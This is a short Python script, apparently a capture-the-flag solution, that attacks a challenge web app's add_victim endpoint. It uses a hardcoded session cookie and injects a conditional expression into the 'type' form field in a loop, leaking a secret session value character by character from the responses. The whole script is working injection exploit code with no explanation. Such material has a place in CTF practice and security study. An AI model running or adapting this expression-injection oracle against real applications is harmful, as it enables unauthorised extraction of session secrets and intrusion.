import requests

sess=requests.Session()
sess.cookies['session']='d760a1df-2ef1-4ff7-8cb4-14add695a33a'

for i in range(36):
	r=sess.post('http://fixed-scam-generator.web.jctf.pro/add_victim',data={
		'firstname':'a',
		'surname':'a',
		'fullname':'a',
		'money':'a',
		'type':'1 if request.args.yo not in session.sid.%d else a.b'%i
		})
	print r.content.split('"checkbox" value=')[-1].split('"')[1]